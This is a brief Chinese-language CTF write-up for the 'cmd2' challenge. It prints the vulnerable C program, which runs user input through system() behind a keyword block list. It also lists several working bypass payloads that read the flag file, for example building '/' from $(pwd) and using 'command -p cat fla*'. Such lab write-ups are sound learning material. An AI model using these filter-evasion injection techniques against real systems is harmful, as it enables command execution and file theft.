# cmd2
跟cmd1 差不多 但是過濾條件更加嚴格

原本的作法是想要 用$SHELL 去開一個shell 然後 path 沒有被修改過 再去讀flag

但是不行

最後就是 發現 pwd 可以用 所以切到 `/`

拼出 `./home/cmd2/cmd2  '""$(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fl*""'`

要加引號是 因為外面會去掉一層引號去程式裡面  它進去system時 還要引號 like:`system("sh")`

或是 用 sh `echo '\57'` 就會輸出`/`

還有一堆奇淫怪道 https://gist.github.com/dual5651/910a89eabcb471ab3a314ed52a82a5c7
總之這題解法很多

` ./cmd2 "read a; \$a"`

`./cmd2 "command -p cat fla*"`
```=
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}

```
